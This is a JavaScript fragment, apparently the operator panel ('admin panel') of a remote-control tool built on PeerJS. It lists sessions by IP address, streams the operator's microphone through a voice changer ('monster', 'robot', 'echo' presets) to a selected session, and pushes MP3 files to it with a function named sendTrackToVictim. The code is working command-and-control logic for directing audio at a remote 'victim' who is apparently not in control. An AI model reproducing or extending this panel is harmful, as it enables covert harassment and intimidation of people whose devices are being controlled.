// Голос
const pitchSlider = document.getElementById('pitchSlider');
const echoSlider = document.getElementById('echoSlider');
const pitchVal = document.getElementById('pitchVal');
const echoVal = document.getElementById('echoVal');
pitchSlider.oninput = () => { voiceParams.pitch = pitchSlider.value / 100; pitchVal.textContent = voiceParams.pitch.toFixed(2); };
echoSlider.oninput = () => { voiceParams.echo = echoSlider.value / 100; echoVal.textContent = echoSlider.value + '%'; if (wetGain) wetGain.gain.value = voiceParams.echo; };

document.querySelectorAll('.preset-btn').forEach(b => {
    b.onclick = () => {
        document.querySelectorAll('.preset-btn').forEach(x => x.classList.remove('active'));
        b.classList.add('active');
        const p = b.dataset.preset;
        if (p === 'normal') setVoice(100, 0);
        else if (p === 'monster') setVoice(60, 20);
        else if (p === 'girl') setVoice(150, 0);
        else if (p === 'kid') setVoice(180, 0);
        else if (p === 'robot') setVoice(100, 0);
        else if (p === 'echo') setVoice(100, 70);
    };
});
function setVoice(pi, ec) {
    pitchSlider.value = pi; echoSlider.value = ec;
    pitchVal.textContent = (pi/100).toFixed(2);
    echoVal.textContent = ec + '%';
    voiceParams.pitch = pi/100;
    voiceParams.echo = ec/100;
    if (wetGain) wetGain.gain.value = voiceParams.echo;
}

function makeVoiceCall() {
    if (!modifiedStream || !peer || !peer.open || !friendVoicePeerId) return;
    try {
        if (voiceCall) { try { voiceCall.close(); } catch(e){} }
        voiceCall = peer.call(friendVoicePeerId, modifiedStream);
        voiceCall.on('stream', () => {});
        log('🎙 Звоню другу на voice peer', 'info');
    } catch(e) { log('❌ ' + e.message, 'err'); }
}

document.getElementById('talkBtn').addEventListener('click', async () => {
    const btn = document.getElementById('talkBtn');
    const status = document.getElementById('talkStatus');
    if (myMicStream) {
        myMicStream.getTracks().forEach(t => t.stop());
        myMicStream = null;
        if (audioCtx) { try { audioCtx.close(); } catch(e){} audioCtx = null; }
        sourceNode = null; destNode = null; wetGain = null; dryGain = null;
        modifiedStream = null;
        if (voiceCall) { try { voiceCall.close(); } catch(e){} voiceCall = null; }
        btn.classList.remove('active', 'recording');
        btn.innerHTML = '🎙 Начать говорить';
        status.textContent = 'Не активно';
        status.className = 'voice-status';
        return;
    }
    if (!selectedIp) { alert('Выбери сессию'); return; }
    const s = conns.get(selectedIp);
    if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
    try {
        myMicStream = await navigator.mediaDevices.getUserMedia({audio: true, video: false});
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        sourceNode = audioCtx.createMediaStreamSource(myMicStream);
        delayNode = audioCtx.createDelay(1.0);
        delayNode.delayTime.value = 0.15;
        feedbackNode = audioCtx.createGain();
        feedbackNode.gain.value = 0.3;
        wetGain = audioCtx.createGain();
        wetGain.gain.value = voiceParams.echo;
        dryGain = audioCtx.createGain();
        dryGain.gain.value = 1;
        destNode = audioCtx.createMediaStreamDestination();
        sourceNode.connect(dryGain);
        dryGain.connect(destNode);
        sourceNode.connect(delayNode);
        delayNode.connect(feedbackNode);
        feedbackNode.connect(delayNode);
        delayNode.connect(wetGain);
        wetGain.connect(destNode);
        modifiedStream = destNode.stream;
        s.conn.send({action: 'startVoiceListen'});
        btn.classList.add('active', 'recording');
        btn.innerHTML = '🔴 Говорю...';
        status.textContent = '⏳ Ждём друга...';
        status.className = 'voice-status';
    } catch(e) {
        alert('Микрофон: ' + e.message);
    }
});

// MP3
const tracks = [];
let currentIdx = -1;
const audio = document.getElementById('mp3Audio');
const dropZone = document.getElementById('dropZone');
const fileInput = document.getElementById('fileInput');
const playlist = document.getElementById('playlist');

dropZone.onclick = () => fileInput.click();
fileInput.onchange = (e) => { handleFiles(e.target.files); fileInput.value = ''; };
dropZone.addEventListener('dragover', (e) => { e.preventDefault(); dropZone.classList.add('dragover'); });
dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
dropZone.addEventListener('drop', (e) => { e.preventDefault(); dropZone.classList.remove('dragover'); handleFiles(e.dataTransfer.files); });

function handleFiles(files) {
    for (const f of files) {
        if (!f.type.startsWith('audio/')) continue;
        const reader = new FileReader();
        reader.onload = () => {
            tracks.push({name: f.name, url: URL.createObjectURL(f), dataUrl: reader.result});
            renderPlaylist();
            if (currentIdx === -1 && tracks.length) selectTrack(0);
            log(`🎵 Загружен: ${f.name}`, 'info');
        };
        reader.readAsDataURL(f);
    }
}

document.getElementById('addUrlBtn').onclick = () => {
    const url = document.getElementById('mp3Url').value.trim();
    if (!url) return;
    tracks.push({name: url.split('/').pop() || 'URL', url, dataUrl: url});
    document.getElementById('mp3Url').value = '';
    renderPlaylist();
    if (currentIdx === -1) selectTrack(0);
};

function renderPlaylist() {
    document.getElementById('trackCount').textContent = tracks.length + ' треков';
    if (!tracks.length) { playlist.innerHTML = '<div class="empty" style="padding:20px;font-size:12px">Плейлист пуст</div>'; return; }
    playlist.innerHTML = '';
    tracks.forEach((t, i) => {
        const d = document.createElement('div');
        d.className = 'playlist-item' + (i === currentIdx ? ' active' : '');
        d.innerHTML = `<div class="playlist-name">🎵 ${t.name}</div><div class="playlist-actions"><button data-act="play" data-idx="${i}">▶</button><button data-act="send" data-idx="${i}">📤</button><button data-act="del" data-idx="${i}">🗑</button></div>`;
        d.onclick = (e) => { if (e.target.tagName === 'BUTTON') return; selectTrack(i); };
        d.querySelector('[data-act="play"]').onclick = (e) => { e.stopPropagation(); selectTrack(i); playLocal(); };
        d.querySelector('[data-act="send"]').onclick = (e) => { e.stopPropagation(); sendTrackToVictim(i); };
        d.querySelector('[data-act="del"]').onclick = (e) => { e.stopPropagation(); removeTrack(i); };
        playlist.appendChild(d);
    });
}
function selectTrack(i) { currentIdx = i; audio.src = tracks[i].url; audio.load(); document.getElementById('mp3Title').textContent = tracks[i].name; renderPlaylist(); }
function removeTrack(i) { tracks.splice(i,1); if (currentIdx===i) currentIdx=-1; else if (currentIdx>i) currentIdx--; renderPlaylist(); }
function playLocal() { if (currentIdx!==-1) audio.play().catch(()=>{}); }
audio.addEventListener('timeupdate', () => { if (!audio.duration) return; document.getElementById('mp3Seek').value = (audio.currentTime/audio.duration)*100; document.getElementById('mp3Time').textContent = fmtTime(audio.currentTime); document.getElementById('mp3Dur').textContent = fmtTime(audio.duration); });
function fmtTime(s) { if (!isFinite(s)) return '0:00'; return Math.floor(s/60) + ':' + (Math.floor(s%60)<10?'0':'') + Math.floor(s%60); }
document.getElementById('mp3Seek').oninput = (e) => { if (!audio.duration) return; audio.currentTime = (e.target.value/100)*audio.duration; };
document.getElementById('mp3Play').onclick = playLocal;
document.getElementById('mp3Pause').onclick = () => audio.pause();
document.getElementById('mp3Stop').onclick = () => { audio.pause(); audio.currentTime = 0; };
document.getElementById('mp3Remove').onclick = () => { if (currentIdx!==-1) removeTrack(currentIdx); };
document.getElementById('mp3Send').onclick = () => { if (currentIdx!==-1) sendTrackToVictim(currentIdx); };

async function sendTrackToVictim(idx) {
    if (!selectedIp) { alert('Выбери сессию'); return; }
    const s = conns.get(selectedIp);
    if (!s || !s.conn || !s.conn.open) { alert('Сессия офлайн'); return; }
    const t = tracks[idx];
    if (t.dataUrl.length > 12 * 1024 * 1024) { alert('Файл слишком большой'); return; }
    s.conn.send({action: 'playMp3', dataUrl: t.dataUrl, name: t.name});
    log(`🎵 Отправлен: ${t.name}`, 'info');
}

setInterval(() => { renderSessions(); updateStatsMini(); }, 2000);
initPeer();
log('⚙️ Админка запущена', 'info');
